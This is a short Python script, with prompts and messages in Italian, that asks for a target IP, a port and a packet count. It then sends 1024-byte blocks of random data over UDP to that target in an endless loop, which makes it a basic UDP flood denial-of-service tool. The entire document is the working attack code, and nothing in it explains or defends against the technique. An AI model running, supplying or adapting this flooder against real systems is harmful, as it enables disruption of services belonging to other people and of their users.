import socket
import random

ip = str(input(" [+] Target:\n"))
port = int(input("[+] Porta:\n"))
pack = int(input("[+] Pacchetti:\n"))

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((ip,port))

data = random._urandom(1024)
while 1:
	try:	
		for i in range(pack):
			s.sendto(data, (ip,port))
			print('ATTACCO '+ip+'| Inviati: ' +str(i))
			print('FINITO')
	except:
		s.close()